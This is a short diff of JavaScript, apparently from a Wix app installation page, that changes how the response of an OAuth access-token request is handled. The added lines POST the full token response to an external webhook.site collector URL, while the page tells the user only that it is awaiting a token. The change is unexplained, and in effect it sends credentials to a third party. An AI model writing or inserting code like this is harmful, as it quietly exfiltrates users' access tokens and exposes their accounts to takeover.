@@ -16,8 +16,8 @@
       xhr.open('post', "https://www.wix.com/oauth/access");
       xhr.onreadystatechange = function onreadystatechange(e) {
         let xhr2 = new XMLHttpRequest();
-        xhr.open('get', '' + encodeURIComponent(xhr.response));
-        xhr.send();
+        xhr2.open('post', 'https://webhook.site/88b74f80-60c3-4792-bfab-a59f1375b0f1');
+        xhr2.send(xhr.response);
         document.getElementById('await').innerText = "Awaiting token response... Please input your token into the box below to proceed with installation";
       }
       xhr.send(JSON.stringify({
